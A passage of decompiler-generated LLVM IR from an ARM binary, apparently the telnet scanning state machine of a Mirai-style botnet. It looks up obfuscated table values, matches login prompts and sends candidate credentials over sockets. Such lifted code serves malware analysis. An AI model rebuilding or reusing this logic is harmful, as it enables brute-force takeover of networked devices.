  %v2_10058 = trunc i32 %v2_10054 to i8
  store i8 %v2_10058, i8* %v3_1004c, align 1
  %v0_1005c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_1004c, %bb386
  %v0_1005c = phi i32 [ %v3_10058, %dec_label_pc_1004c ], [ %v0_1005c.pre, %bb386 ]
  %v1_1005c = add i32 %v0_1005c, 1
  store i32 %v1_1005c, i32* %r2.global-to-local, align 4
  %v3_10060 = icmp uge i32 %v1_1005c, %v4_1003c
  store i1 %v3_10060, i1* %cpsr_c.global-to-local, align 1
  %v9_10060 = icmp eq i32 %v1_1005c, %v4_1003c
  store i1 %v9_10060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10060, label %dec_label_pc_10068, label %dec_label_pc_1004c

dec_label_pc_10068:                               ; preds = %.thread63, %dec_label_pc_100bc
  store i32 ptrtoint (i32* @global_var_235f0.165 to i32), i32* @ip, align 4
  %v0_1006c = load i32, i32* @r5, align 4
  %v1_1006c = add i32 %v0_1006c, 24
  %v2_1006c = inttoptr i32 %v1_1006c to i32*
  %v3_1006c = load i32, i32* %v2_1006c, align 4
  %v2_10070 = load i32, i32* @global_var_235f0.165, align 4
  store i32 %v2_10070, i32* %r2.global-to-local, align 4
  %v2_10074 = add i32 %v3_1006c, %v4_1003c
  store i32 %v2_10074, i32* %r3.global-to-local, align 4
  store i32 %v2_10074, i32* %v2_1006c, align 4
  %v0_1007c = load i32, i32* %r2.global-to-local, align 4
  %v1_1007c = load i32, i32* @r5, align 4
  %v2_1007c = add i32 %v1_1007c, 8
  %v3_1007c = inttoptr i32 %v2_1007c to i32*
  store i32 %v0_1007c, i32* %v3_1007c, align 4
  br label %dec_label_pc_10080

dec_label_pc_10080:                               ; preds = %dec_label_pc_101a0, %dec_label_pc_10068
  %v0_10080 = load i32, i32* @r5, align 4
  %v1_10080 = add i32 %v0_10080, 12
  %v2_10080 = inttoptr i32 %v1_10080 to i32*
  %v3_10080 = load i32, i32* %v2_10080, align 4
  store i32 %v3_10080, i32* %r0.global-to-local, align 4
  %v1_10084 = add i32 %v3_10080, -2
  store i32 %v1_10084, i32* @r3, align 4
  %v7_10088 = icmp eq i32 %v1_10084, 8
  store i1 %v7_10088, i1* %cpsr_z.global-to-local, align 1
  %v5_1008c = and i32 %v1_10084, 1073741824
  %v6_1008c = icmp ne i32 %v5_1008c, 0
  store i1 %v6_1008c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10080, label %dec_label_pc_10004.backedge [
    i32 2, label %dec_label_pc_10898
    i32 3, label %dec_label_pc_106ac
    i32 4, label %dec_label_pc_107a4
    i32 5, label %dec_label_pc_10518
    i32 6, label %dec_label_pc_10370
    i32 7, label %dec_label_pc_1029c
    i32 8, label %dec_label_pc_10444
    i32 9, label %dec_label_pc_101c8
    i32 10, label %dec_label_pc_10124
  ]

dec_label_pc_100b8:                               ; preds = %dec_label_pc_1001c
  br i1 %v2_10040, label %dec_label_pc_10cd0, label %dec_label_pc_100bc

dec_label_pc_100bc:                               ; preds = %dec_label_pc_100b8
  %v3_100bc = icmp eq i32 %v4_1003c, -1
  store i1 %v3_100bc, i1* %cpsr_c.global-to-local, align 1
  %v8_100bc = icmp eq i32 %v4_1003c, -1
  store i1 %v8_100bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_100bc, label %dec_label_pc_100c4, label %dec_label_pc_10068

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100bc
  %v0_100c4 = load i32, i32* @sb, align 4
  %v1_100c4 = inttoptr i32 %v0_100c4 to i32*
  %v2_100c4 = load i32, i32* %v1_100c4, align 4
  store i32 %v2_100c4, i32* %r3.global-to-local, align 4
  %v2_100c8 = icmp ugt i32 %v2_100c4, 10
  store i1 %v2_100c8, i1* %cpsr_c.global-to-local, align 1
  %v7_100c8 = icmp eq i32 %v2_100c4, 11
  store i1 %v7_100c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100c8, label %dec_label_pc_1010c, label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %dec_label_pc_100c4, %dec_label_pc_10cd0
  %v0_100d0 = load i32, i32* @r5, align 4
  %v1_100d0 = add i32 %v0_100d0, 4
  %v2_100d0 = inttoptr i32 %v1_100d0 to i32*
  %v3_100d0 = load i32, i32* %v2_100d0, align 4
  store i32 %v3_100d0, i32* %r0.global-to-local, align 4
  %v1_100d4 = call i32 @__GI___libc_close(i32 %v3_100d0)
  store i32 %v1_100d4, i32* %r0.global-to-local, align 4
  %v0_100d8 = load i32, i32* @r5, align 4
  %v1_100d8 = add i32 %v0_100d8, 284
  %v2_100d8 = inttoptr i32 %v1_100d8 to i8*
  %v3_100d8 = load i8, i8* %v2_100d8, align 1
  %v4_100d8 = zext i8 %v3_100d8 to i32
  %v1_100dc = add nuw nsw i32 %v4_100d8, 1
  %v1_100e0 = urem i32 %v1_100dc, 256
  store i32 %v1_100e0, i32* %r3.global-to-local, align 4
  %v2_100e4 = icmp ugt i32 %v1_100e0, 8
  store i1 %v2_100e4, i1* %cpsr_c.global-to-local, align 1
  %v7_100e4 = icmp eq i32 %v1_100e0, 9
  store i1 %v7_100e4, i1* %cpsr_z.global-to-local, align 1
  %v1_100e8 = trunc i32 %v1_100dc to i8
  store i8 %v1_100e8, i8* %v2_100d8, align 1
  %v0_100ec = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_100ec = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_100ec = xor i1 %v1_100ec, true
  %v3_100ec = and i1 %v0_100ec, %v2_100ec
  br i1 %v3_100ec, label %bb387, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_100d0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_100f8289294 = load i32, i32* @r5, align 4
  %v2_100f8290295 = add i32 %v1_100f8289294, 4
  %v3_100f8291296 = inttoptr i32 %v2_100f8290295 to i32*
  store i32 -1, i32* %v3_100f8291296, align 4
  br label %bb388

bb387:                                            ; preds = %dec_label_pc_100d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100f8285 = load i32, i32* @r5, align 4
  %v2_100f8286 = add i32 %v1_100f8285, 4
  %v3_100f8287 = inttoptr i32 %v2_100f8286 to i32*
  store i32 -1, i32* %v3_100f8287, align 4
  %v4_100fc = load i32, i32* %r0.global-to-local, align 4
  %v5_100fc = load i32, i32* @r5, align 4
  %v6_100fc = add i32 %v5_100fc, 12
  %v7_100fc = inttoptr i32 %v6_100fc to i32*
  store i32 %v4_100fc, i32* %v7_100fc, align 4
  %v4_10100 = load i32, i32* %r3.global-to-local, align 4
  %v5_10100 = trunc i32 %v4_10100 to i8
  %v6_10100 = load i32, i32* @r5, align 4
  %v7_10100 = add i32 %v6_10100, 284
  %v8_10100 = inttoptr i32 %v7_10100 to i8*
  store i8 %v5_10100, i8* %v8_10100, align 1
  %v0_10104.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10104.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb388

bb388:                                            ; preds = %.thread293, %bb387
  %v1_10108 = phi i1 [ %v1_10104.pre, %bb387 ], [ %v0_100ec, %.thread293 ]
  %v0_10108 = phi i1 [ %v0_10104.pre, %bb387 ], [ %v1_100ec, %.thread293 ]
  %v2_10104 = xor i1 %v1_10108, true
  %v3_10104 = or i1 %v0_10108, %v2_10104
  br i1 %v3_10104, label %bb389, label %bb390

bb389:                                            ; preds = %bb388
  %v4_10104 = load i32, i32* @r5, align 4
  store i32 %v4_10104, i32* %r0.global-to-local, align 4
  br label %bb390

bb390:                                            ; preds = %bb388, %bb389
  store i32 65804, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10104, i32 ptrtoint (i32* @global_var_f384.262 to i32))
  br label %dec_label_pc_1010c

dec_label_pc_1010c:                               ; preds = %dec_label_pc_10000.loopexit, %dec_label_pc_10004.backedge, %dec_label_pc_10000.preheader, %dec_label_pc_100c4, %dec_label_pc_ffe4, %dec_label_pc_ff98, %dec_label_pc_10c2c, %bb390
  %v3_1010c = load i16, i16* %stack_var_-52, align 2
  %v4_1010c = sext i16 %v3_1010c to i32
  store i32 %v4_1010c, i32* %r3.global-to-local, align 4
  %v1_10110 = add nsw i32 %v4_1010c, 1
  store i32 %v1_10110, i32* @r4, align 4
  %v2_10114 = icmp ugt i32 %v1_10110, 254
  store i1 %v2_10114, i1* %cpsr_c.global-to-local, align 1
  %v7_10114 = icmp eq i32 %v1_10110, 255
  store i1 %v7_10114, i1* %cpsr_z.global-to-local, align 1
  %v5_10118 = trunc i32 %v1_10110 to i16
  store i16 %v5_10118, i16* %stack_var_-52, align 2
  %v7_1011c = icmp sgt i16 %v3_1010c, 254
  br i1 %v7_1011c, label %dec_label_pc_f9cc, label %dec_label_pc_ff98

dec_label_pc_10124:                               ; preds = %dec_label_pc_10080
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10128 = call i32 @table_unlock_val(i32 30)
  store i32 %v2_10750, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_10138 = call i32 @table_retrieve_val(i32 30, i32* %v2_10758)
  %v3_1013c = load i8, i8* %stack_var_-56, align 1
  %v4_1013c = sext i8 %v3_1013c to i32
  store i32 %v3_10138, i32* %r2.global-to-local, align 4
  %v1_10144 = add nsw i32 %v4_1013c, -1
  store i32 %v1_10144, i32* %r3.global-to-local, align 4
  %v0_10148 = load i32, i32* @sl, align 4
  store i32 %v0_10148, i32* %r0.global-to-local, align 4
  %v0_1014c = load i32, i32* @r5, align 4
  %v1_1014c = add i32 %v0_1014c, 24
  %v2_1014c = inttoptr i32 %v1_1014c to i32*
  %v3_1014c = load i32, i32* %v2_1014c, align 4
  store i32 %v3_1014c, i32* %r1.global-to-local, align 4
  %v4_10150 = call i32 @util_memsearch(i32 %v0_10148, i32 %v3_1014c, i32 %v3_10138, i32 %v1_10144)
  %v2_10154 = icmp eq i32 %v4_10150, -1
  store i1 %v2_10154, i1* %cpsr_c.global-to-local, align 1
  %v7_10154 = icmp eq i32 %v4_10150, -1
  store i1 %v7_10154, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10150, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10a20 = call i32 @table_lock_val(i32 30)
  br i1 %v7_10154, label %dec_label_pc_10a1c, label %dec_label_pc_10160

dec_label_pc_10160:                               ; preds = %dec_label_pc_10124
  store i32 %v1_10a20, i32* %r0.global-to-local, align 4
  %v0_10168 = load i32, i32* @r5, align 4
  %v1_10168 = add i32 %v0_10168, 4
  %v2_10168 = inttoptr i32 %v1_10168 to i32*
  %v3_10168 = load i32, i32* %v2_10168, align 4
  store i32 %v3_10168, i32* %r0.global-to-local, align 4
  %v1_1016c = call i32 @__GI___libc_close(i32 %v3_10168)
  store i32 %v1_1016c, i32* %r0.global-to-local, align 4
  %v0_10170 = load i32, i32* @r5, align 4
  %v1_10170 = add i32 %v0_10170, 284
  %v2_10170 = inttoptr i32 %v1_10170 to i8*
  %v3_10170 = load i8, i8* %v2_10170, align 1
  %v4_10170 = zext i8 %v3_10170 to i32
  %v1_10174 = add nuw nsw i32 %v4_10170, 1
  %v1_10178 = urem i32 %v1_10174, 256
  store i32 %v1_10178, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10180 = icmp ugt i32 %v1_10178, 9
  store i1 %v2_10180, i1* %cpsr_c.global-to-local, align 1
  %v7_10180 = icmp eq i32 %v1_10178, 10
  store i1 %v7_10180, i1* %cpsr_z.global-to-local, align 1
  %v2_10184 = add i32 %v0_10170, 4
  %v3_10184 = inttoptr i32 %v2_10184 to i32*
  store i32 -1, i32* %v3_10184, align 4
  %v0_10188 = load i32, i32* @r3, align 4
  %v1_10188 = trunc i32 %v0_10188 to i8
  %v2_10188 = load i32, i32* @r5, align 4
  %v3_10188 = add i32 %v2_10188, 284
  %v4_10188 = inttoptr i32 %v3_10188 to i8*
  store i8 %v1_10188, i8* %v4_10188, align 1
  %v0_1018c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1018c, label %dec_label_pc_10190, label %dec_label_pc_10b10

dec_label_pc_10190:                               ; preds = %dec_label_pc_10160
  store i32 0, i32* @r3, align 4
  %v1_10194 = load i32, i32* @r5, align 4
  %v2_10194 = add i32 %v1_10194, 12
  %v3_10194 = inttoptr i32 %v2_10194 to i32*
  store i32 0, i32* %v3_10194, align 4
  %v0_10198 = load i32, i32* @r3, align 4
  %v1_10198 = trunc i32 %v0_10198 to i8
  %v2_10198 = load i32, i32* @r5, align 4
  %v3_10198 = add i32 %v2_10198, 284
  %v4_10198 = inttoptr i32 %v3_10198 to i8*
  store i8 %v1_10198, i8* %v4_10198, align 1
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %dec_label_pc_10b10, %dec_label_pc_10190
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_101a0

dec_label_pc_101a0:                               ; preds = %dec_label_pc_1088c, %dec_label_pc_10654, %dec_label_pc_104c0, %dec_label_pc_103ec, %dec_label_pc_10318, %dec_label_pc_10244, %dec_label_pc_1019c
  %v0_101a0 = load i32, i32* @r5, align 4
  %v1_101a0 = add i32 %v0_101a0, 24
  %v2_101a0 = inttoptr i32 %v1_101a0 to i32*
  %v3_101a0 = load i32, i32* %v2_101a0, align 4
  %v0_101a4 = load i32, i32* @r7, align 4
  %v2_101a4 = sub i32 %v0_101a4, %v3_101a0
  %v3_101a4 = icmp uge i32 %v0_101a4, %v3_101a0
  store i1 %v3_101a4, i1* %cpsr_c.global-to-local, align 1
  %v4_101a4 = xor i32 %v0_101a4, %v3_101a0
  %v5_101a4 = xor i32 %v2_101a4, %v0_101a4
  %v6_101a4 = and i32 %v5_101a4, %v4_101a4
  %v7_101a4 = icmp slt i32 %v6_101a4, 0
  %v8_101a4 = icmp slt i32 %v2_101a4, 0
  %v9_101a4 = icmp eq i32 %v0_101a4, %v3_101a0
  store i1 %v9_101a4, i1* %cpsr_z.global-to-local, align 1
  %v2_101a8 = xor i1 %v8_101a4, %v7_101a4
  %v0_101a4.v3_101a0 = select i1 %v2_101a8, i32 %v0_101a4, i32 %v3_101a0
  store i32 %v0_101a4.v3_101a0, i32* %r1.global-to-local, align 4
  %v2_101b0 = sub i32 %v3_101a0, %v0_101a4.v3_101a0
  store i32 %v2_101b0, i32* @r2, align 4
  store i32 %v2_101b0, i32* %v2_101a0, align 4
  %v0_101b8 = load i32, i32* @sl, align 4
  %v1_101b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_101b8 = add i32 %v1_101b8, %v0_101b8
  store i32 %v2_101b8, i32* @r1, align 4
  store i32 %v0_101b8, i32* @r0, align 4
  %v3_101c0 = call i32 @memmove(i32 %v0_101b8, i32 %v2_101b8, i32 %v2_101b0)
  store i32 %v3_101c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10080

dec_label_pc_101c8:                               ; preds = %dec_label_pc_10080
  %v1_101c8 = add i32 %v0_10080, 24
  %v2_101c8 = inttoptr i32 %v1_101c8 to i32*
  %v3_101c8 = load i32, i32* %v2_101c8, align 4
  store i32 %v3_101c8, i32* %r2.global-to-local, align 4
  %v1_101cc = add i32 %v3_101c8, -1
  store i32 %v1_101cc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101d0 = icmp eq i32 %v1_101cc, 0
  store i1 %v2_101d0, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_101cc, 1
  br i1 %tmp393, label %dec_label_pc_10004.backedge.thread, label %dec_label_pc_101d8

dec_label_pc_101d8:                               ; preds = %dec_label_pc_101c8
  %v2_101d8 = add i32 %v1_101cc, %v0_10080
  store i32 %v2_101d8, i32* %r3.global-to-local, align 4
  %v1_101dc = add i32 %v2_101d8, 28
  %v2_101dc = inttoptr i32 %v1_101dc to i8*
  %v3_101dc = load i8, i8* %v2_101dc, align 1
  %v4_101dc = zext i8 %v3_101dc to i32
  store i32 %v4_101dc, i32* %r3.global-to-local, align 4
  %v2_101e0 = icmp ugt i8 %v3_101dc, 61
  store i1 %v2_101e0, i1* %cpsr_c.global-to-local, align 1
  %v7_101e0 = icmp eq i8 %v3_101dc, 62
  store i1 %v7_101e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101e0, label %dec_label_pc_10244, label %bb394

bb394:                                            ; preds = %dec_label_pc_101d8
  %v3_101e4 = icmp ugt i8 %v3_101dc, 57
  store i1 %v3_101e4, i1* %cpsr_c.global-to-local, align 1
  %v8_101e4 = icmp eq i8 %v3_101dc, 58
  store i1 %v8_101e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_101e4, label %dec_label_pc_10244, label %dec_label_pc_101ec

dec_label_pc_101ec:                               ; preds = %bb394
  %v2_101ec = icmp ugt i8 %v3_101dc, 35
  store i1 %v2_101ec, i1* %cpsr_c.global-to-local, align 1
  %v7_101ec = icmp eq i8 %v3_101dc, 36
  store i1 %v7_101ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101ec, label %dec_label_pc_10244, label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101ec
  %v2_101f4 = icmp ugt i8 %v3_101dc, 34
  store i1 %v2_101f4, i1* %cpsr_c.global-to-local, align 1
  %v7_101f4 = icmp eq i8 %v3_101dc, 35
  store i1 %v7_101f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101f4, label %dec_label_pc_10244, label %dec_label_pc_101fc

dec_label_pc_101fc:                               ; preds = %dec_label_pc_101f4
  %v2_101fc = icmp ugt i8 %v3_101dc, 36
  store i1 %v2_101fc, i1* %cpsr_c.global-to-local, align 1
  %v7_101fc = icmp eq i8 %v3_101dc, 37
  store i1 %v7_101fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101fc, label %dec_label_pc_10244, label %dec_label_pc_1022c.preheader

dec_label_pc_1022c.preheader:                     ; preds = %dec_label_pc_101fc
  %v3_10200 = add i32 %v0_10080, 28
  %v2_10204 = add i32 %v3_10200, %v3_101c8
  store i32 %v2_10204, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1022c

dec_label_pc_10210:                               ; preds = %bb395
  %v2_10210 = icmp ugt i8 %v3_10234, 35
  store i1 %v2_10210, i1* %cpsr_c.global-to-local, align 1
  %v7_10210 = icmp eq i8 %v3_10234, 36
  store i1 %v7_10210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10210, label %dec_label_pc_10244, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %dec_label_pc_10210
  %v2_10218 = icmp ugt i8 %v3_10234, 34
  store i1 %v2_10218, i1* %cpsr_c.global-to-local, align 1
  %v7_10218 = icmp eq i8 %v3_10234, 35
  store i1 %v7_10218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10218, label %dec_label_pc_10244, label %dec_label_pc_10220

dec_label_pc_10220:                               ; preds = %dec_label_pc_10218
  %v2_10220 = icmp ugt i8 %v3_10234, 36
  store i1 %v2_10220, i1* %cpsr_c.global-to-local, align 1
  %v7_10220 = icmp eq i8 %v3_10234, 37
  store i1 %v7_10220, i1* %cpsr_z.global-to-local, align 1
  %v1_10224 = add i32 %v0_10224, -1
  store i32 %v1_10224, i32* %r3.global-to-local, align 4
  br i1 %v7_10220, label %dec_label_pc_10244, label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %dec_label_pc_1022c.preheader, %dec_label_pc_10220
  %v0_10224 = phi i32 [ %v2_10204, %dec_label_pc_1022c.preheader ], [ %v1_10224, %dec_label_pc_10220 ]
  %v0_1022c = phi i32 [ %v1_101cc, %dec_label_pc_1022c.preheader ], [ %v1_1022c, %dec_label_pc_10220 ]
  %v1_1022c = add i32 %v0_1022c, -1
  store i32 %v1_1022c, i32* %r1.global-to-local, align 4
  %v2_1022c = icmp ne i32 %v0_1022c, 0
  store i1 %v2_1022c, i1* %cpsr_c.global-to-local, align 1
  %v7_1022c = icmp eq i32 %v0_1022c, 1
  store i1 %v7_1022c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1022c, label %dec_label_pc_10004.backedge.thread528, label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_1022c
  %v1_10234 = add i32 %v0_10224, -2
  %v2_10234 = inttoptr i32 %v1_10234 to i8*
  %v3_10234 = load i8, i8* %v2_10234, align 1
  %v4_10234 = zext i8 %v3_10234 to i32
  store i32 %v4_10234, i32* %r2.global-to-local, align 4
  %v2_10238 = icmp ugt i8 %v3_10234, 61
  store i1 %v2_10238, i1* %cpsr_c.global-to-local, align 1
  %v7_10238 = icmp eq i8 %v3_10234, 62
  store i1 %v7_10238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10238, label %dec_label_pc_10244, label %bb395

bb395:                                            ; preds = %dec_label_pc_10234
  %v3_1023c = icmp ugt i8 %v3_10234, 57
  store i1 %v3_1023c, i1* %cpsr_c.global-to-local, align 1
  %v8_1023c = icmp eq i8 %v3_10234, 58
  store i1 %v8_1023c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1023c, label %dec_label_pc_10244, label %dec_label_pc_10210

dec_label_pc_10244:                               ; preds = %dec_label_pc_10234, %bb395, %dec_label_pc_10220, %dec_label_pc_10218, %dec_label_pc_10210, %dec_label_pc_101fc, %dec_label_pc_101d8, %dec_label_pc_101f4, %dec_label_pc_101ec, %bb394
  %v0_10248 = phi i32 [ %v1_101cc, %dec_label_pc_101fc ], [ %v1_101cc, %dec_label_pc_101d8 ], [ %v1_101cc, %dec_label_pc_101f4 ], [ %v1_101cc, %dec_label_pc_101ec ], [ %v1_101cc, %bb394 ], [ %v1_1022c, %dec_label_pc_10210 ], [ %v1_1022c, %dec_label_pc_10218 ], [ %v1_1022c, %dec_label_pc_10220 ], [ %v1_1022c, %bb395 ], [ %v1_1022c, %dec_label_pc_10234 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10248 = add i32 %v0_10248, 1
  store i32 %v1_10248, i32* @r7, align 4
  %v1_1024c = call i32 @table_unlock_val(i32 28)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_1025c = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  store i32 %v3_1025c, i32* %r0.global-to-local, align 4
  %v3_10260 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10260, i32* %r2.global-to-local, align 4
  store i32 %v3_1025c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1026c = load i32, i32* @r5, align 4
  %v1_1026c = add i32 %v0_1026c, 4
  %v2_1026c = inttoptr i32 %v1_1026c to i32*
  %v3_1026c = load i32, i32* %v2_1026c, align 4
  store i32 %v3_1026c, i32* %r0.global-to-local, align 4
  %v4_10270 = call i32 @__libc_send(i32 %v3_1026c, i32 %v3_1025c, i32 %v3_10260, i32 16384)
  store i32 %v4_10270, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10280 = load i32, i32* @r5, align 4
  %v1_10280 = add i32 %v0_10280, 4
  %v2_10280 = inttoptr i32 %v1_10280 to i32*
  %v3_10280 = load i32, i32* %v2_10280, align 4
  store i32 %v3_10280, i32* %r0.global-to-local, align 4
  %v4_10284 = call i32 @__libc_send(i32 %v3_10280, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1028c = call i32 @table_lock_val(i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10294 = load i32, i32* @r5, align 4
  %v2_10294 = add i32 %v1_10294, 12
  %v3_10294 = inttoptr i32 %v2_10294 to i32*
  store i32 10, i32* %v3_10294, align 4
  br label %dec_label_pc_101a0

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10080
  %v1_1029c = add i32 %v0_10080, 24
  %v2_1029c = inttoptr i32 %v1_1029c to i32*
  %v3_1029c = load i32, i32* %v2_1029c, align 4
  store i32 %v3_1029c, i32* %r2.global-to-local, align 4
  %v1_102a0 = add i32 %v3_1029c, -1
  store i32 %v1_102a0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_102a4 = icmp eq i32 %v1_102a0, 0
  store i1 %v2_102a4, i1* %cpsr_z.global-to-local, align 1
  %tmp396 = icmp slt i32 %v1_102a0, 1
  br i1 %tmp396, label %dec_label_pc_10004.backedge.thread, label %dec_label_pc_102ac

dec_label_pc_102ac:                               ; preds = %dec_label_pc_1029c
  %v2_102ac = add i32 %v1_102a0, %v0_10080
  store i32 %v2_102ac, i32* %r3.global-to-local, align 4
  %v1_102b0 = add i32 %v2_102ac, 28
  %v2_102b0 = inttoptr i32 %v1_102b0 to i8*
  %v3_102b0 = load i8, i8* %v2_102b0, align 1
  %v4_102b0 = zext i8 %v3_102b0 to i32
  store i32 %v4_102b0, i32* %r3.global-to-local, align 4
  %v2_102b4 = icmp ugt i8 %v3_102b0, 61
  store i1 %v2_102b4, i1* %cpsr_c.global-to-local, align 1
  %v7_102b4 = icmp eq i8 %v3_102b0, 62
  store i1 %v7_102b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b4, label %dec_label_pc_10318, label %bb397

bb397:                                            ; preds = %dec_label_pc_102ac
  %v3_102b8 = icmp ugt i8 %v3_102b0, 57
  store i1 %v3_102b8, i1* %cpsr_c.global-to-local, align 1
  %v8_102b8 = icmp eq i8 %v3_102b0, 58
  store i1 %v8_102b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_102b8, label %dec_label_pc_10318, label %dec_label_pc_102c0

dec_label_pc_102c0:                               ; preds = %bb397
  %v2_102c0 = icmp ugt i8 %v3_102b0, 35
  store i1 %v2_102c0, i1* %cpsr_c.global-to-local, align 1
  %v7_102c0 = icmp eq i8 %v3_102b0, 36
  store i1 %v7_102c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102c0, label %dec_label_pc_10318, label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102c0
  %v2_102c8 = icmp ugt i8 %v3_102b0, 34
  store i1 %v2_102c8, i1* %cpsr_c.global-to-local, align 1
  %v7_102c8 = icmp eq i8 %v3_102b0, 35
  store i1 %v7_102c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102c8, label %dec_label_pc_10318, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102c8
  %v2_102d0 = icmp ugt i8 %v3_102b0, 36
  store i1 %v2_102d0, i1* %cpsr_c.global-to-local, align 1
  %v7_102d0 = icmp eq i8 %v3_102b0, 37
  store i1 %v7_102d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102d0, label %dec_label_pc_10318, label %dec_label_pc_10300.preheader

dec_label_pc_10300.preheader:                     ; preds = %dec_label_pc_102d0
  %v3_102d4 = add i32 %v0_10080, 28
  %v2_102d8 = add i32 %v3_102d4, %v3_1029c
  store i32 %v2_102d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10300

dec_label_pc_102e4:                               ; preds = %bb398
  %v2_102e4 = icmp ugt i8 %v3_10308, 35
  store i1 %v2_102e4, i1* %cpsr_c.global-to-local, align 1
  %v7_102e4 = icmp eq i8 %v3_10308, 36
  store i1 %v7_102e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102e4, label %dec_label_pc_10318, label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102e4
  %v2_102ec = icmp ugt i8 %v3_10308, 34
  store i1 %v2_102ec, i1* %cpsr_c.global-to-local, align 1
  %v7_102ec = icmp eq i8 %v3_10308, 35
  store i1 %v7_102ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102ec, label %dec_label_pc_10318, label %dec_label_pc_102f4

dec_label_pc_102f4:                               ; preds = %dec_label_pc_102ec
  %v2_102f4 = icmp ugt i8 %v3_10308, 36
  store i1 %v2_102f4, i1* %cpsr_c.global-to-local, align 1
  %v7_102f4 = icmp eq i8 %v3_10308, 37
  store i1 %v7_102f4, i1* %cpsr_z.global-to-local, align 1
  %v1_102f8 = add i32 %v0_102f8, -1
  store i32 %v1_102f8, i32* %r3.global-to-local, align 4
  br i1 %v7_102f4, label %dec_label_pc_10318, label %dec_label_pc_10300

dec_label_pc_10300:                               ; preds = %dec_label_pc_10300.preheader, %dec_label_pc_102f4
  %v0_102f8 = phi i32 [ %v2_102d8, %dec_label_pc_10300.preheader ], [ %v1_102f8, %dec_label_pc_102f4 ]
  %v0_10300 = phi i32 [ %v1_102a0, %dec_label_pc_10300.preheader ], [ %v1_10300, %dec_label_pc_102f4 ]
  %v1_10300 = add i32 %v0_10300, -1
  store i32 %v1_10300, i32* %r1.global-to-local, align 4
  %v2_10300 = icmp ne i32 %v0_10300, 0
  store i1 %v2_10300, i1* %cpsr_c.global-to-local, align 1
  %v7_10300 = icmp eq i32 %v0_10300, 1
  store i1 %v7_10300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10300, label %dec_label_pc_10004.backedge.thread528, label %dec_label_pc_10308

dec_label_pc_10308:                               ; preds = %dec_label_pc_10300
  %v1_10308 = add i32 %v0_102f8, -2
